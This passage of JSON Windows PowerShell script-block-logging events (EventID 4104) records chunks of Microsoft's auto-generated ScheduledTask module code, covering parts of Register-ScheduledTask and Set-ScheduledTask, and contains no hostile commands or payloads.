$__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByPrincipal', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('User') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          ",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991359Z"
    },
    "EventRecordID": 38,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 15,
    "MessageTotal": 19,
    "ScriptBlockText": "$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunLevel')) {\r\n          [object]$__cmdletization_value = ${RunLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByUser', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Xml') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Xml')) {\r\n          [object]$__cmdletization_value = ${Xml}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByXml', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosof",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991372Z"
    },
    "EventRecordID": 39,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 16,
    "MessageTotal": 19,
    "ScriptBlockText": "t.PowerShell.Core\\Export-ModuleMember -Function 'Register-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Set-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='User', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=6)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Password},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=2)]\r\n    [Parameter(ParameterSetName='User', Position=5)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${User},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=5)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Principal},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=2)]\r\n    [Parameter(ParameterSetName='User', Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=1)]\r\n    [Parameter(ParameterSetName='User', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=4)]\r\n    [Parameter(ParameterSetName='User', Position=4)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Principal', Position=3)]\r\n    [Parameter(ParameterSetName='User', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='Principal', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='User', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Principal')]\r\n    [Parameter(ParameterSetName='User')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Principal') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Principal')) {\r\n          [object]$__cmdletization_value = ${Principal}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = 